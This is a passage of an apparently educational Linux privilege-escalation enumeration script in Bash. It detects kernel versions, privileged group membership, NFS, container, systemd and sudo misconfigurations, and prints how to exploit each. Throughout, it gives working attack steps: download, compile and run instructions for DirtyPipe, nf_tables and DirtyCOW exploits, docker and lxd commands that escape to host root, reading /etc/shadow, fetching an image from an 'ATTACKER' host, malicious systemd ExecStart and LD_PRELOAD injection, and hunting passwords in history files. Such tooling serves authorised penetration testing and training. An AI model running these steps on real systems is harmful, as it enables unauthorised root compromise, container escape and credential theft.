        teach "  6. You've now modified a read-only file!"
        teach ""
        teach "REAL-WORLD EXAMPLE:"
        teach "  Target: /etc/passwd (read-only, owned by root)"
        teach "  Action: Add a new root user without password"
        teach "  Result: Instant root access"
        teach ""
        teach "HOW TO EXPLOIT:"
        teach "  1. Check if vulnerable:"
        teach "     uname -r (kernel 5.8 - 5.16.11 = vulnerable)"
        teach "  2. Download exploit:"
        teach "     https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits"
        teach "  3. Compile:"
        teach "     gcc exploit-1.c -o exploit"
        teach "  4. Run:"
        teach "     ./exploit"
        teach "  5. The exploit will:"
        teach "     - Overwrite /etc/passwd to add user 'aaron' with no password"
        teach "     - Or make /bin/bash SUID for instant root"
        teach ""
        teach "WHY IT'S CALLED DIRTY PIPE:"
        teach "  • 'Dirty' = Modifying read-only data (like Dirty COW)"
        teach "  • 'Pipe' = Exploits Linux pipe mechanism"
        teach ""
        teach "AFFECTED SYSTEMS:"
        teach "  Kernels: 5.8 - 5.16.11, 5.15.25, 5.10.102"
        teach "  Most Linux distributions from 2020-2022"
        teach ""
        teach "IMPACT: Any user can overwrite any file → Root access"
        log ""
    fi
    
    # === nf_tables (CVE-2024-1086) ===
    if [ "$major" -eq 5 ] && [ "$minor" -ge 14 ] && [ "$minor" -le 18 ]; then
        vuln "Potentially vulnerable to nf_tables (CVE-2024-1086)"
        log ""
        teach "╔════════════════════════════════════════════════════════════╗"
        teach "║  CVE-2024-1086 - nf_tables Use-After-Free"
        teach "╚════════════════════════════════════════════════════════════╝"
        teach ""
        teach "WHAT IT IS:"
        teach "  A use-after-free vulnerability in the nftables (netfilter)"
        teach "  subsystem that allows local privilege escalation to root."
        teach ""
        teach "BACKGROUND - What is nftables:"
        teach "  nftables is Linux's firewall framework (successor to iptables)."
        teach "  It allows filtering network packets, managing firewall rules."
        teach "  Runs in kernel space for performance."
        teach ""
        teach "WHY IT EXISTS:"
        teach "  'Use-after-free' is a memory corruption bug. Here's what happens:"
        teach ""
        teach "  1. Kernel allocates memory for an nftables object"
        teach "  2. Kernel frees that memory (object deleted)"
        teach "  3. Kernel tries to use that memory again"
        teach "  4. But the memory might now contain attacker-controlled data"
        teach "  5. Kernel executes attacker's data = code execution as root"
        teach ""
        teach "SIMPLIFIED ANALOGY:"
        teach "  Imagine a library book:"
        teach "  1. You check out a book (allocate memory)"
        teach "  2. You return it (free memory)"
        teach "  3. Someone else checks it out and writes notes in it"
        teach "  4. You try to read your old notes (use-after-free)"
        teach "  5. But you're actually reading the new person's notes!"
        teach ""
        teach "TECHNICAL DETAILS:"
        teach "  The vulnerability is in how nftables handles anonymous sets."
        teach "  When deleting rules, the kernel frees memory but doesn't"
        teach "  clear all references to it. Attacker can trigger reuse of"
        teach "  that freed memory, overwriting kernel data structures."
        teach ""
        teach "REQUIREMENTS:"
        teach "  • CONFIG_USER_NS=y (user namespaces enabled)"
        teach "  • nftables support compiled in kernel"
        teach ""
        teach "HOW TO CHECK IF EXPLOITABLE:"
        teach "  1. Check kernel config:"
        teach "     grep CONFIG_USER_NS /boot/config-\$(uname -r)"
        teach "  2. If =y, likely vulnerable"
        teach ""
        teach "HOW TO EXPLOIT:"
        teach "  1. Check if vulnerable: uname -r (5.14-5.18)"
        teach "  2. Download exploit:"
        teach "     https://github.com/Notselwyn/CVE-2024-1086"
        teach "  3. Compile (requires kernel headers):"
        teach "     gcc exploit.c -o exploit"
        teach "  4. Run:"
        teach "     ./exploit"
        teach ""
        teach "WHY IT'S COMPLEX:"
        teach "  This is an advanced exploit requiring:"
        teach "  • Understanding of kernel memory management"
        teach "  • Heap manipulation (kernel heap spray)"
        teach "  • Timing-dependent (race condition)"
        teach ""
        teach "IMPACT: Local privilege escalation, works in containers"
        log ""
    fi
    
    # === DirtyCOW (CVE-2016-5195) ===
    if [ "$major" -eq 4 ]; then
        vuln "Kernel 4.x - Multiple known exploits available"
        teach "Older kernel - check exploit-db for specific version"
        log ""
        
        if [ "$minor" -le 10 ]; then
            critical "Kernel vulnerable to DirtyCOW (CVE-2016-5195) - Instant root"
            vuln "Potentially vulnerable to DirtyCOW (CVE-2016-5195)"
            log ""
            teach "╔════════════════════════════════════════════════════════════╗"
            teach "║  CVE-2016-5195 - Dirty COW (Copy-On-Write Race Condition)"
            teach "╚════════════════════════════════════════════════════════════╝"
            teach ""
            teach "WHAT IT IS:"
            teach "  One of the most famous Linux kernel vulnerabilities ever found."
            teach "  Allows writing to read-only files by exploiting a race condition"
            teach "  in the Copy-On-Write (COW) mechanism. Existed for 9+ years."
            teach ""
            teach "BACKGROUND - What is Copy-On-Write:"
            teach "  When you fork() a process, Linux doesn't immediately copy all"
            teach "  memory. Instead, parent and child share the same memory pages"
            teach "  marked as read-only. Only when one tries to write, the kernel"
            teach "  makes a copy. This saves memory and improves performance."
            teach ""
            teach "WHY IT EXISTS (The Race Condition):"
            teach "  There's a tiny time window between when the kernel:"
            teach "  1. Checks if you can write to a page (permission check)"
            teach "  2. Actually performs the write operation"
            teach ""
            teach "  The exploit abuses this timing gap:"
            teach "  Thread 1: Repeatedly calls madvise() to discard the page"
            teach "  Thread 2: Repeatedly tries to write to the read-only file"
            teach ""
            teach "  If timed perfectly:"
            teach "  • Thread 1 discards the COW page"
            teach "  • Thread 2 writes during the tiny gap"
            teach "  • Kernel writes to the ORIGINAL page (not the copy)"
            teach "  • You've just modified a read-only file!"
            teach ""
            teach "WHY IT'S CALLED DIRTY COW:"
            teach "  • 'Dirty' = Modified pages in memory"
            teach "  • 'COW' = Copy-On-Write mechanism"
            teach "  • Also a fun name that went viral"
            teach ""
            teach "THE EXPLOIT PROCESS:"
            teach "  1. Open /etc/passwd (read-only)"
            teach "  2. Map it into memory with mmap()"
            teach "  3. Start two threads racing:"
            teach "     - One calling madvise(MADV_DONTNEED) repeatedly"
            teach "     - One writing to the memory repeatedly"
            teach "  4. Race condition succeeds"
            teach "  5. Your write goes to the real file"
            teach "  6. Add root user or overwrite existing user's password hash"
            teach ""
            teach "HOW TO EXPLOIT:"
            teach "  1. Check vulnerability: uname -r (< 4.8.3 = vulnerable)"
            teach "  2. Download exploit:"
            teach "     https://github.com/dirtycow/dirtycow.github.io"
            teach "     https://github.com/firefart/dirtycow"
            teach "  3. Compile:"
            teach "     gcc -pthread dirty.c -o dirty -lcrypt"
            teach "  4. Run:"
            teach "     ./dirty mypassword"
            teach "  5. Creates user 'firefart' with UID 0 (root)"
            teach "  6. Login:"
            teach "     su firefart"
            teach "     Password: mypassword"
            teach ""
            teach "VARIATIONS:"
            teach "  • SUID binary injection (make /usr/bin/passwd writeable)"
            teach "  • Direct /etc/shadow modification"
            teach "  • SELinux/AppArmor policy modification"
            teach ""
            teach "WHY IT EXISTED SO LONG:"
            teach "  • Race conditions are hard to find"
            teach "  • The timing window is microseconds"
            teach "  • Required specific knowledge of kernel internals"
            teach "  • Copy-On-Write is a fundamental kernel feature"
            teach ""
            teach "IMPACT: Any user → Root, works on almost all Linux systems"
            teach "        Affected billions of devices (servers, Android, IoT)"
            log ""
        fi
    fi
    
    # === Kernel 3.x ===
    if [ "$major" -eq 3 ]; then
        critical "Kernel 3.x - ANCIENT kernel with many known exploits"
        vuln "Extremely outdated kernel - highly exploitable"
        log ""
        teach "╔════════════════════════════════════════════════════════════╗"
        teach "║  Kernel 3.x - Legacy Kernel (End of Life)"
        teach "╚════════════════════════════════════════════════════════════╝"
        teach ""
        teach "WHAT THIS MEANS:"
        teach "  Kernel 3.x was released 2011-2015 and is no longer maintained."
        teach "  It contains DOZENS of known privilege escalation vulnerabilities."
        teach ""
        teach "COMMON KERNEL 3.x EXPLOITS:"
        teach "  • DirtyCOW (CVE-2016-5195) - Already described above"
        teach "  • Overlayfs (CVE-2015-1328) - Ubuntu specific"
        teach "  • perf_event (CVE-2013-2094) - Affects 3.4 - 3.13"
        teach "  • recvmsg (CVE-2014-0038) - Memory corruption"
        teach "  • futex (CVE-2014-3153) - Towelroot exploit"
        teach ""
        teach "HOW TO FIND EXPLOITS:"
        teach "  1. Check exact version: uname -r"
        teach "  2. Search exploit-db:"
        teach "     searchsploit linux kernel $kernel_version"
        teach "  3. Try automated tools:"
        teach "     https://github.com/mzet-/linux-exploit-suggester"
        teach "     ./linux-exploit-suggester.sh"
        teach "  4. Check specific CVE databases"
        teach ""
        teach "RECOMMENDATION:"
        teach "  Use exploit suggester tools - too many CVEs to check manually"
        log ""
    fi
    
    # === Kernel 2.x ===
    if [ "$major" -eq 2 ]; then
        critical "Kernel 2.x - PREHISTORIC kernel - trivial to exploit"
        vuln "Kernel from the stone age - run exploit suggester"
        log ""
        teach "This kernel is from the early 2000s. It predates most modern"
        teach "security features. Almost certainly has dozens of working exploits."
        teach "Use linux-exploit-suggester to find them all."
        log ""
    fi
    
    # === General guidance ===
    log ""
    teach "═══════════════════════════════════════════════════════════════"
    teach "KERNEL EXPLOITATION - GENERAL CONCEPTS"
    teach "═══════════════════════════════════════════════════════════════"
    teach ""
    teach "WHY KERNEL EXPLOITS ARE DIFFERENT:"
    teach ""
    teach "  User-space exploits (sudo, SUID, cron):"
    teach "  • Require specific misconfigurations"
    teach "  • Depend on what's installed"
    teach "  • Can be fixed by admin without reboot"
    teach "  • Different across systems"
    teach ""
    teach "  Kernel exploits:"
    teach "  • Work regardless of system configuration"
    teach "  • Same kernel = same vulnerability across distributions"
    teach "  • Bypass ALL security (SELinux, AppArmor, containers)"
    teach "  • Require reboot to patch (admins delay this)"
    teach "  • Escape containers (containers share host kernel)"
    teach ""
    teach "KERNEL EXPLOIT WORKFLOW:"
    teach ""
    teach "  1. IDENTIFY"
    teach "     • Check kernel version: uname -r"
    teach "     • Note the distribution: cat /etc/os-release"
    teach "     • Check architecture: uname -m"
    teach ""
    teach "  2. SEARCH"
    teach "     • exploit-db: searchsploit linux kernel [version]"
    teach "     • Google: 'linux kernel [version] exploit'"
    teach "     • Exploit suggester: linux-exploit-suggester.sh"
    teach "     • GitHub: Search for CVE numbers"
    teach ""
    teach "  3. DOWNLOAD"
    teach "     • wget/curl to download .c file"
    teach "     • Or git clone the repository"
    teach "     • Read the exploit code (understand what it does)"
    teach ""
    teach "  4. COMPILE"
    teach "     • Check if gcc/make available: which gcc"
    teach "     • Compile: gcc exploit.c -o exploit"
    teach "     • Some need specific flags (read exploit comments)"
    teach "     • If no compiler, compile on similar system and transfer"
    teach ""
    teach "  5. EXECUTE"
    teach "     • chmod +x exploit"
    teach "     • ./exploit"
    teach "     • Many exploits spawn root shell automatically"
    teach "     • Some require additional steps (read the output)"
    teach ""
    teach "TROUBLESHOOTING:"
    teach "  • Exploit doesn't compile:"
    teach "    - Check kernel headers: apt install linux-headers-\$(uname -r)"
    teach "    - Try on matching system and transfer binary"
    teach ""
    teach "  • Exploit crashes:"
    teach "    - Kernel exploits are often unstable"
    teach "    - Try different exploit for same CVE"
    teach "    - Check if kernel is slightly different version"
    teach ""
    teach "  • No root shell:"
    teach "    - Check if ASLR/SMEP/SMAP enabled (harder exploitation)"
    teach "    - Try a different exploit variant"
    teach ""
    teach "CONTAINERS AND KERNEL EXPLOITS:"
    teach "  • Containers (Docker, LXC) share the HOST kernel"
    teach "  • If host kernel is vulnerable, container can escape"
    teach "  • Kernel exploit in container = root on HOST"
    teach "  • This is why kernel patches are critical for containers"
    teach ""
    teach "RECOMMENDED TOOLS:"
    teach "  • linux-exploit-suggester:"
    teach "    https://github.com/mzet-/linux-exploit-suggester"
    teach "  • linux-exploit-suggester-2:"
    teach "    https://github.com/jondonas/linux-exploit-suggester-2"
    teach ""
    info "For comprehensive kernel exploit search, use the tools above"
    log ""
}
# === PATH HIJACKING ===
enum_path() {
    section "PATH HIJACKING OPPORTUNITIES"
    
    explain_concept "PATH Hijacking" \
        "Programs can call commands using relative paths (e.g., 'ls' instead of '/bin/ls'). The shell searches \$PATH directories in order. If you control an early PATH directory, you control what gets executed." \
        "Lazy coding + SUID binaries = exploitable. Admins write scripts that call 'cat' or 'whoami' without full paths. If that script is SUID or run by cron as root, and you can create a malicious binary earlier in PATH, you win." \
        "Steps:\n  1. Find writable directory in PATH\n  2. Identify SUID binary that calls relative commands: strings /path/to/suid | grep -v '/'\n  3. Create malicious version: echo '/bin/sh' > /writable/path/command; chmod +x\n  4. Execute SUID binary"
    
    local writable_path=0
    
    info "Current PATH: $PATH"
    
    echo "$PATH" | tr ':' '\n' | while read dir; do
        if [ -w "$dir" ]; then
            critical "Writable PATH directory: $dir - Hijack commands for privilege escalation"
            vuln "Writable directory in PATH: $dir"
            writable_path=1
            teach "You can create fake binaries here. They'll be executed by:"
            teach "  • SUID binaries calling system commands"
            teach "  • Sudo commands using relative paths"
            teach "  • Root cron jobs with simple PATH"
            teach "  • Other users' scripts"
            
            teach "Common targets to hijack: ls, cat, whoami, id, ps, netstat"
        fi
    done
    
    [ $writable_path -eq 0 ] && ok "No writable directories in PATH"
    
    # Check if current directory is in PATH
    if echo "$PATH" | grep -qE '(^|:)\.(:$|$)'; then
        critical "Current directory (.) in PATH - Extreme hijacking risk"
        vuln "Current directory (.) is in PATH!"
        teach "Extremely dangerous - any command can be hijacked"
    fi
}

# === SPECIAL GROUPS ===
enum_groups() {
    section "PRIVILEGED GROUP MEMBERSHIP"
    
    explain_concept "Special Groups" \
        "Certain Linux groups grant powerful capabilities. Membership in these groups can be equivalent to root access." \
        "Groups exist to delegate specific privileges. Docker group = control containers as root. Disk group = read any file. LXD group = create privileged containers. Admins add users for convenience, not realizing the security implications." \
        "Dangerous groups and exploitation:\n  • docker: Mount host filesystem in container\n  • lxd/lxc: Create privileged container\n  • disk: Direct disk access bypasses permissions\n  • video: Capture framebuffer screenshots\n  • sudo: Obvious, but check for NOPASSWD"
    
    local current_groups=$(groups)
    info "Your groups: $current_groups"
    
    # Check for docker group
    if echo "$current_groups" | grep -qw "docker"; then
        critical "DOCKER GROUP - Instant root: docker run -v /:/mnt --rm -it alpine chroot /mnt /bin/bash"
        vuln "You are in the DOCKER group!"
        explain_concept "Docker Group Exploitation" \
            "Docker daemon runs as root. Docker group members can execute commands inside containers that run as root and can mount the host filesystem." \
            "This is by design - Docker needs root to manage containers. The security issue is that Docker group = root equivalent, but admins don't realize this when adding users." \
            "Exploitation:\n  docker run -v /:/mnt --rm -it alpine chroot /mnt /bin/bash\n  This:\n    1. Mounts entire host filesystem to /mnt in container\n    2. chroot into /mnt (now you're in host filesystem)\n    3. Running as root inside container = root on host\n  Alternative: docker run -v /etc/shadow:/tmp/shadow alpine cat /tmp/shadow"
    fi
    
    # Check for lxd/lxc group
    if echo "$current_groups" | grep -qE "lxd|lxc"; then
        critical "LXD/LXC GROUP - Create privileged container for root access"
        vuln "You are in the LXD/LXC group!"
        explain_concept "LXD Group Exploitation" \
            "LXD manages Linux containers. Group members can create privileged containers with security.privileged=true, which disables most isolation." \
            "Similar to Docker - container management needs root. Privileged containers can access host resources directly, including mounting host filesystem with no restrictions." \
            "Exploitation:\n  lxc init ubuntu:18.04 privesc -c security.privileged=true\n  lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true\n  lxc start privesc\n  lxc exec privesc /bin/bash\n  cd /mnt/root/root"
        
        teach "Alternative method if no internet for image download:"
        teach "  1. Build minimal Alpine image on your machine"
        teach "  2. Transfer to target: python3 -m http.server (on attacker)"
        teach "  3. wget http://ATTACKER/alpine.tar.gz"
        teach "  4. lxc image import alpine.tar.gz --alias privesc"
        teach "  5. Follow exploitation steps above"
    fi
    
    # Check for disk group
    if echo "$current_groups" | grep -qw "disk"; then
        critical "DISK GROUP - Read any file: debugfs /dev/sda1"
        vuln "You are in the DISK group!"
        explain_concept "Disk Group Exploitation" \
            "Disk group grants direct access to block devices (/dev/sda, etc). This bypasses all filesystem permissions." \
            "The disk group exists for disk management utilities. Direct disk access means you can read raw disk sectors, bypassing Linux permission checks entirely." \
            "Exploitation:\n  debugfs /dev/sda1 (interactive disk editor)\n  debugfs: cat /etc/shadow\n  Or: dd if=/dev/sda of=/tmp/disk.img (copy entire disk)\n  Or: Use debugfs to read /root/.ssh/id_rsa"
    fi
    
    # Check for video group
    if echo "$current_groups" | grep -qw "video"; then
        warn "You are in the VIDEO group"
        teach "Video group can access framebuffer devices"
        teach "  Capture screenshots of root user sessions: cat /dev/fb0 > screenshot.raw"
        teach "  May reveal passwords being typed, sensitive information"
    fi
    
    # Check for adm group
    if echo "$current_groups" | grep -qw "adm"; then
        info "You are in the ADM group"
        teach "Adm group can read most log files in /var/log"
        teach "  Useful for password hunting, finding misconfigurations"
        teach "  Check auth.log, apache logs, application logs for secrets"
    fi
}

# === NFS EXPORTS ===
enum_nfs() {
    section "NFS EXPORT ANALYSIS"
    
    if [ ! -f /etc/exports ]; then
        ok "No NFS exports configured"
        return
    fi
    
    explain_concept "NFS no_root_squash" \
        "NFS (Network File System) shares directories over network. 'no_root_squash' means root on client = root on server." \
        "By default, NFS 'squashes' root UID to nobody for security. But 'no_root_squash' disables this. If you can mount the share, you can create files as root on the server." \
        "Exploitation:\n  1. Mount the NFS share: mount -t nfs server:/share /mnt\n  2. Create SUID binary: cp /bin/bash /mnt/bash; chmod +s /mnt/bash\n  3. On server, this bash is now SUID root\n  4. Execute: /share/bash -p"
    
    grep -v "^#" /etc/exports 2>/dev/null | grep -v "^$" | while read line; do
        info "NFS export: $line"
        
        if echo "$line" | grep -q "no_root_squash"; then
            critical "NFS no_root_squash - Mount from another machine as root"
            vuln "NFS export has 'no_root_squash': $line"
            teach "If you can access this from another machine as root, you gain root on this system"
        fi
        
        if echo "$line" | grep -qE "rw|no_all_squash"; then
            warn "NFS export is writable or doesn't squash all UIDs"
        fi
    done
}

# === CONTAINER ESCAPE ===
enum_container() {
    section "CONTAINER DETECTION & ESCAPE"
    
    explain_concept "Container Environments" \
        "Containers isolate processes but share the host kernel. Misconfigurations or vulnerabilities can allow escape to host." \
        "Containers use namespaces and cgroups for isolation. If privileged, mounted with host volumes, or on vulnerable Docker, you may escape. Containers are NOT VMs - same kernel as host." \
        "Common escape vectors:\n  • Privileged container (--privileged flag)\n  • Docker socket mounted inside\n  • Host filesystem mounted\n  • Kernel exploits (affects host)\n  • CAP_SYS_ADMIN capability\n  • Misconfigured cgroups\n  • Shared PID namespace"
    
    local in_container=0
    local container_type=""
    
    # Check if running in container
    if [ -f /.dockerenv ]; then
        in_container=1
        container_type="Docker"
        warn "Running inside a DOCKER container"
        
        # Check .dockerenv contents (sometimes contains info)
        if [ -s /.dockerenv ]; then
            info "/.dockerenv is not empty:"
            cat /.dockerenv 2>/dev/null
        fi
        
    elif [ -f /run/.containerenv ]; then
        in_container=1
        container_type="Podman"
        warn "Running inside a PODMAN container"
        
    elif grep -qa container=lxc /proc/1/environ 2>/dev/null; then
        in_container=1
        container_type="LXC"
        warn "Running inside an LXC container"
        
    elif [ -d /proc/vz ] && [ ! -d /proc/bc ]; then
        in_container=1
        container_type="OpenVZ"
        warn "Running inside OpenVZ container"
    fi
    
    if [ $in_container -eq 0 ]; then
        ok "Not in a detected container environment"
        return
    fi
    
    # Detailed container analysis
    info "Container type detected: $container_type"
    
    # === CHECK 1: Privileged Container ===
    info "Checking if container is privileged..."
    if ip link add dummy0 type dummy 2>/dev/null; then
        ip link delete dummy0 2>/dev/null
        critical "PRIVILEGED CONTAINER - Full host access possible"
        vuln "Container is PRIVILEGED!"
        explain_concept "Privileged Container Escape" \
            "Privileged containers have almost all capabilities and can access host devices." \
            "The --privileged flag disables most security features. It's used for nested Docker, device access, etc. But it allows mounting host filesystem and accessing host resources." \
            "Exploitation:\n  1. List host disks: fdisk -l\n  2. Mount host root: mkdir /mnt/host && mount /dev/sda1 /mnt/host\n  3. Chroot to host: chroot /mnt/host /bin/bash\n  4. Alternative: Access /dev/mem or /dev/kmem for direct memory access"
        
        teach "Privileged escape steps:"
        teach "  fdisk -l  # Find host disk (usually /dev/sda1 or /dev/vda1)"
        teach "  mkdir /mnt/host"
        teach "  mount /dev/sda1 /mnt/host"
        teach "  chroot /mnt/host /bin/bash"
        teach "  # You're now on the host as root"
    else
        ok "Container is NOT privileged (cannot create network interfaces)"
    fi
    
    # === CHECK 2: Capabilities ===
    info "Checking container capabilities..."
    if command -v capsh >/dev/null 2>&1; then
        local caps=$(capsh --print 2>/dev/null)
        echo "$caps" | grep "Current:" | log
        
        # Check for dangerous capabilities
        if echo "$caps" | grep -q "cap_sys_admin"; then
            critical "CAP_SYS_ADMIN in container - Mount host filesystem or load kernel modules"
            vuln "Container has CAP_SYS_ADMIN!"
            teach "With CAP_SYS_ADMIN you can:"
            teach "  • Mount host filesystems"
            teach "  • Manipulate namespaces"
            teach "  • Potentially escape container"
        fi
        
        if echo "$caps" | grep -q "cap_sys_ptrace"; then
            warn "CAP_SYS_PTRACE - Can debug host processes if PID namespace shared"
        fi
        
        if echo "$caps" | grep -q "cap_dac_override"; then
            warn "CAP_DAC_OVERRIDE - Can bypass file permissions on mounted volumes"
        fi
    else
        warn "capsh not available - install libcap2-bin to check capabilities"
    fi
    
    # === CHECK 3: Docker Socket ===
    if [ -S /var/run/docker.sock ]; then
        critical "Docker socket MOUNTED - Full container orchestration access"
        vuln "Docker socket is accessible inside container: /var/run/docker.sock"
        explain_concept "Docker Socket Exploitation" \
            "The Docker socket allows full control over the Docker daemon. If mounted inside a container, you can create new containers, access host filesystem, or escape." \
            "Developers mount docker.sock for 'Docker-in-Docker' scenarios or CI/CD. This gives container full control over all containers and the host." \
            "Exploitation:\n  1. Create privileged container: docker run -v /:/host -it alpine chroot /host /bin/bash\n  2. Or exec into existing container as root\n  3. Access host filesystem through new container"
        
        # Check if we can actually use it
        if command -v docker >/dev/null 2>&1; then
            if docker ps 2>/dev/null | grep -q "."; then
                critical "Docker socket is USABLE - Can create escape container"
                teach "Escape command:"
                teach "  docker run -v /:/mnt --rm -it alpine chroot /mnt /bin/bash"
            fi
        else
            warn "Docker socket present but docker client not installed"
            teach "If you can install or upload docker binary, you can escape"
        fi
    fi
    
    # === CHECK 4: Seccomp Profile ===
    info "Checking seccomp profile..."
    if [ -f /proc/self/status ]; then
        local seccomp=$(grep Seccomp /proc/self/status 2>/dev/null | awk '{print $2}')
        case "$seccomp" in
            0)
                warn "Seccomp: DISABLED - No syscall filtering (dangerous for host)"
                teach "No seccomp means you can make any syscall"
                ;;
            1)
                ok "Seccomp: STRICT - Very restrictive"
                ;;
            2)
                info "Seccomp: FILTER - Default Docker profile active"
                ok "Standard syscall filtering in place"
                ;;
            *)
                info "Seccomp: UNKNOWN ($seccomp)"
                ;;
        esac
    fi
    
    # === CHECK 5: AppArmor/SELinux ===
    info "Checking container MAC (Mandatory Access Control)..."
    if [ -f /proc/self/attr/current ]; then
        local mac_profile=$(cat /proc/self/attr/current 2>/dev/null)
        if [ -n "$mac_profile" ] && [ "$mac_profile" != "unconfined" ]; then
            info "MAC profile: $mac_profile"
            ok "Container has MAC restrictions"
        else
            warn "MAC: unconfined - No AppArmor/SELinux restrictions"
            teach "Unconfined = easier to exploit misconfigurations"
        fi
    fi
    
    # === CHECK 6: PID Namespace ===
    info "Checking PID namespace isolation..."
    local host_pid_count=$(ps aux 2>/dev/null | wc -l)
    
    if [ $host_pid_count -gt 50 ]; then
        critical "PID namespace likely SHARED - Can see host processes"
        vuln "Can see $host_pid_count processes - likely host PID namespace"
        teach "Shared PID namespace means:"
        teach "  • You can see all host processes"
        teach "  • With CAP_SYS_PTRACE you can attach to them"
        teach "  • Look for sensitive processes: ps aux | grep -E 'ssh|su|sudo'"
    else
        ok "PID namespace appears isolated (only $host_pid_count processes visible)"
    fi
    
    # === CHECK 7: Cgroup Analysis ===
    info "Analyzing cgroup configuration..."
    if [ -f /proc/1/cgroup ]; then
        cat /proc/1/cgroup | while read line; do
            log "  $line"
        done
        
        # Check if cgroup is writable (release_agent exploit)
        if [ -w /sys/fs/cgroup ]; then
            critical "cgroup filesystem is WRITABLE - release_agent exploit possible"
            vuln "/sys/fs/cgroup is writable!"
            teach "Cgroup release_agent escape:"
            teach "  1. Write malicious script to host-accessible path"
            teach "  2. Configure release_agent to execute it"
            teach "  3. Trigger cgroup cleanup"
            teach "  PoC: https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/"
        fi
    fi
    
    # === CHECK 8: Mounted Filesystems ===
    info "Checking for suspicious mounts..."
    mount | grep -vE "^(proc|tmpfs|devpts|sysfs|cgroup)" | while read line; do
        log "  $line"
        
        # Check for host filesystem mounts
        if echo "$line" | grep -qE "on / type|on /host|on /mnt"; then
            warn "Potential host filesystem mount detected"
        fi
        
        # Check for writable host paths
        local mount_point=$(echo "$line" | awk '{print $3}')
        if [ -w "$mount_point" ] && [ "$mount_point" != "/tmp" ] && [ "$mount_point" != "/dev/shm" ]; then
            vuln "Writable mount from host: $mount_point"
            teach "Check if this is a host directory - you may be able to modify host files"
        fi
    done
    
    # === CHECK 9: Kernel Version ===
    info "Kernel version (shared with host): $(uname -r)"
    teach "Since containers share the host kernel, kernel exploits affect the host"
    teach "Check enum_kernel() section for kernel-specific exploits"
    
    # === CHECK 10: Network Mode ===
    info "Checking network mode..."
    if ip addr | grep -q "docker0\|eth0"; then
        info "Container has network access"
        
        # Check if can reach host
        local host_gateway=$(ip route | grep default | awk '{print $3}')
        if [ -n "$host_gateway" ]; then
            info "Host gateway: $host_gateway"
            teach "Scan host from container: nmap $host_gateway"
            teach "Host may have services only accessible from inside"
        fi
    fi
    
    if ip addr | grep -q "host"; then
        warn "Container might be using host networking (--net=host)"
        teach "Host networking = no network isolation"
    fi
    
    # === Summary ===
    log ""
    info "Container escape strategy summary:"
    teach "1. If privileged: Mount host disk and chroot"
    teach "2. If docker.sock: Create escape container"
    teach "3. If CAP_SYS_ADMIN: Mount host filesystem"
    teach "4. If shared PID + CAP_SYS_PTRACE: Inject into host process"
    teach "5. If writable cgroups: release_agent exploit"
    teach "6. Check for kernel exploits (affects host)"
    teach "7. If mounted host paths: Modify sensitive files (.ssh/authorized_keys)"
}

# === SYSTEMD ANALYSIS ===
enum_systemd() {
    section "SYSTEMD SERVICE ANALYSIS"
    
    explain_concept "Systemd Services" \
        "Systemd manages system services. Writable service files or misconfigured services running as root can be exploited." \
        "Systemd replaced init scripts. Services defined in .service files specify what runs, as which user, and when. If you can modify a service file that runs as root, you control what root executes on boot or service restart." \
        "Attack vectors:\n  • Writable .service file\n  • Service executes writable script\n  • Service uses relative paths\n  • Service has weak permissions"
    
    # Check for writable service files (must be actually writable, not just symlinks)
    find /etc/systemd/system /lib/systemd/system -name "*.service" -type f -writable 2>/dev/null | while read service; do
        # Double-check it's actually writable (not just a symlink artifact)
        if [ -w "$service" ] && [ ! -L "$service" ]; then
            critical "Writable systemd service: $service - Modify ExecStart for root execution"
            vuln "Writable systemd service: $service"
            teach "Modify this service to run your code as root on next start"
            teach "  Add: ExecStart=/bin/bash /tmp/evil.sh"
            teach "  Then: systemctl daemon-reload; systemctl restart \$(basename $service)"
        fi
    done
    
    # Check for services with writable executables
    find /etc/systemd/system /lib/systemd/system -name "*.service" 2>/dev/null | while read service; do
        grep "^ExecStart=" "$service" 2>/dev/null | while read line; do
            local exec_path=$(echo "$line" | sed 's/ExecStart=//' | awk '{print $1}')
            if [ -n "$exec_path" ] && [ -w "$exec_path" ]; then
                vuln "Service $service executes writable file: $exec_path"
            fi
        done
    done
}

# === ENVIRONMENT VARIABLES ===
enum_env() {
    section "ENVIRONMENT VARIABLE ANALYSIS"
    
    explain_concept "Environment Variables" \
        "Environment variables can influence program behavior. LD_PRELOAD, LD_LIBRARY_PATH, and PYTHONPATH can be exploited if preserved through sudo." \
        "Programs load libraries at runtime. LD_PRELOAD forces a library to load first. If sudo preserves this variable (env_keep+=LD_PRELOAD), you can inject code into any sudo command." \
        "Exploitation:\n  1. Create malicious library with init function\n  2. Compile: gcc -shared -fPIC -o evil.so evil.c\n  3. Set: export LD_PRELOAD=/tmp/evil.so\n  4. Run: sudo <any command>\n  5. Your library's code runs as root"
    
    # Check current environment
    if env | grep -i "LD_PRELOAD\|LD_LIBRARY_PATH" | grep -qv "^$"; then
        warn "LD_* variables are set in environment:"
        env | grep -i "LD_PRELOAD\|LD_LIBRARY_PATH"
    fi
    
    # Check if sudo preserves env
    if sudo -l 2>/dev/null | grep -q "env_keep.*LD_PRELOAD"; then
        critical "Sudo preserves LD_PRELOAD - Inject malicious library for instant root"
        vuln "Sudo preserves LD_PRELOAD!"
        teach "Create malicious shared library and execute with any sudo command"
    fi
    
    info "Sudo permissions detected:"
    echo "$sudo_output" | while read line; do
        log "  $line"
    done
    log ""
    
    if sudo -l 2>/dev/null | grep -q "env_keep.*LD_LIBRARY_PATH"; then
        vuln "Sudo preserves LD_LIBRARY_PATH!"
        teach "Similar to LD_PRELOAD but points to directory containing evil library"
    fi
}

# === PASSWORD & HASH HUNTING ===
enum_passwords() {
    section "PASSWORD & CREDENTIAL HUNTING"
    
    explain_concept "Credential Hunting" \
        "Passwords and keys are often stored insecurely in config files, scripts, history files, and environment variables." \
        "Developers hardcode credentials for convenience. Admins store passwords in scripts. Users type them in commands. All leave traces. Finding one password often leads to privilege escalation or lateral movement." \
        "Where to look:\n  • .bash_history, .zsh_history\n  • Config files: *.conf, *.config, *.ini\n  • Scripts: *.sh, *.py, *.pl\n  • Database dumps, backup files\n  • Environment variables\n  • /var/www, application configs"
    
    # Check history files
    for histfile in ~/.bash_history ~/.zsh_history ~/.mysql_history ~/.psql_history; do
        if [ -r "$histfile" ]; then
            if grep -iE "password|passwd|pwd|secret|token|key" "$histfile" 2>/dev/null | head -3 | grep -q "."; then
                warn "Found password-related entries in $histfile"
                grep -iE "password|passwd|pwd|secret" "$histfile" 2>/dev/null | head -3 | while read line; do
                    log "  $line"
                done
